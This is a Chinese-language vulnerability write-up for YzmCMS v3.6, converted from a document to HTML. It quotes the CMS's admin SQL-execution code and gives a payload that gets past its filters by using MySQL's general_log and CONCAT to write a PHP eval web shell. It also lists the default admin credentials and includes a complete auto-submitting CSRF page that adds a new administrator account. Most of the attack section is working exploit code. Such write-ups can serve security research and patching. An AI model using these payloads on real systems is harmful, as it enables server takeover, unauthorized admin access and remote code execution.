<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>YzmCMS v3.6 csrf</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><p>YzmCMS v3.6</p><h2>三、复现过程</h2><p>1、文件位置: /application/admin/controller/sql.class.php第10-42行中：</p><p>public function init() {  <br />    if(isset($_POST['sqlstr'])){  <br />        if(!C('sql_execute')) showmsg('根据系统配置，不允许在线执行SQL命令！', 'stop');  <br />        $sqlstr = MAGIC_QUOTES_GPC ? stripslashes($_POST['sqlstr']) : $_POST['sqlstr'];  <br />        $sqlstr = rtrim(trim($sqlstr), ';');  <br />        $sqls = $_POST['action']=='many' ? explode(';', $sqlstr) : array(0 =&gt; $sqlstr);  <br /><br />        $admin = D('admin');  <br />        foreach($sqls as $sql){  <br />10.             if(stristr($sql, 'outfile')){  <br />11.                 $str = '&lt;span class=&quot;c-red&quot;&gt;ERROR : 检测到非法字符 “outfile”！&lt;/span&gt;';  <br />12.                 break;  <br />13.             }  <br />14.             if(stristr($sql, '.php')){  <br />15.                 $str = '&lt;span class=&quot;c-red&quot;&gt;ERROR : 检测到非法字符 “.php” ！&lt;/span&gt;';  <br />16.                 break;  <br />17.             }  <br />18.             if(preg_match("/^drop(.*)database/i", $sql)){  <br />19.                 $str = '&lt;span class=&quot;c-red&quot;&gt;ERROR : 不允许删除数据库！&lt;/span&gt;';  <br />20.                 break;  <br />21.             }  <br />22.             $result = $admin-&gt;query($sql);   <br />23.             if($result){  <br />24.                 $str = '&lt;span style=&quot;color:green&quot;&gt;OK : 执行成功！&lt;/span&gt;';  <br />25.                 if(is_object($result) || is_resource($result)){  <br />26.                     $arr = $admin-&gt;fetch_all($result);  <br />27.                 }                     <br />28.             }else{  <br />29.                 $str = '&lt;span class=&quot;c-red&quot;&gt;ERROR : 执行失败！&lt;/span&gt;';  <br />30.                 break;  <br />31.             }                 <br />32.         }  <br />33.     }</p><p>这段函数中对提交的sql参数进行还原处理，然后进行非法字符检测，检测字符是否存在”oufile”、”.php”,匹配是否有删除数据的操作等。</p><p>2、如何绕过这种限制？</p><p>首页，outfile被禁止，第一时间想到的就是SQL语句利用日志写入文件，但是写入脚本文件”.php”会被检测到非法字符；然后，尝试MySQL中concat函数来连接字符串，拆分’.php’关键词，如 CONCAT("test.","php");最后构造出可以写入文件，绕过非法字符检测的的SQL语句，从而触发代码执行漏洞，控制服务器。</p><p>Payload：</p><p>show variables like '%general%';   #查看配置<br />set global general_log = on;        #开启general log模式<br />set global general_log_file =CONCAT("E:\\study\\WWW\\YzmCMS\\test.","php"); <br />select '&lt;?php eval($_POST[cmd]);?&gt;';   #写入shell</p><h3>漏洞复现</h3><h4><em>如何获取后台管理员权限</em></h4><p>有两种思路：</p><p>思路A：通过默认信息，弱口令登录</p><p>默认后台路径：<a href="http://www.0-sec.org/admin/index/login.html">http://www.0-sec.org/admin/index/login.html</a></p><p>管理员默认账号密码均为：yzmcms</p><p>思路B：通过CSRF漏洞，诱导管理员访问，自动在后台添加管理员账号。</p><p>CSRF漏洞利用代码如下：</p><p>&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"&gt;  <br /><br />&lt;html&gt;  <br />&lt;head&gt;  <br />&lt;title&gt;OWASP CRSFTester Demonstration&lt;/title&gt;  <br />&lt;/head&gt;  <br />&lt;body οnlοad="javascript:fireForms()"&gt;  <br />&lt;script language="JavaScript"&gt;  <br />var pauses = new Array( "68" );  <br /><br /> function pausecomp(millis)  <br /><br /> {  <br /><br />     var date = new Date();  <br />    var curDate = null;  <br /><br />     do { curDate = new Date(); }  <br />     while(curDate-date &lt; millis);  <br /> }  <br /><br /><br /> function fireForms()  <br /><br /> {  <br /><br />     var count = 1;  <br />     var i=0;  <br /><br />     for(i=0; i&lt;count; i++)  <br />     {  <br />         document.forms[i].submit();  <br /><br />         pausecomp(pauses[i]);  <br />     }  <br /> }  <br /><br /><br /> &lt;/script&gt;  <br /><br /> &lt;H2&gt;OWASP CRSFTester Demonstration&lt;/H2&gt;  <br /><br /> &lt;form method="POST" name="form0" action="http://127.0.0.1:80/admin/admin_manage/add.html"&gt;  <br /><br /> &lt;input type="hidden" name="adminname" value="admin"/&gt;  <br /><br /> &lt;input type="hidden" name="password" value="abc123!"/&gt;  <br /><br /> &lt;input type="hidden" name="password2" value="abc123!"/&gt;  <br /><br /> &lt;input type="hidden" name="email" value=""/&gt;  <br /><br /> &lt;input type="hidden" name="realname" value=""/&gt;  <br /><br /> &lt;input type="hidden" name="roleid" value="1"/&gt;  <br /><br /> &lt;input type="hidden" name="dosubmit" value="1"/&gt;  <br /><br /> &lt;/form&gt;  <br /><br /> &lt;/body&gt;  <br /><br /> &lt;/html&gt;</p></body></html>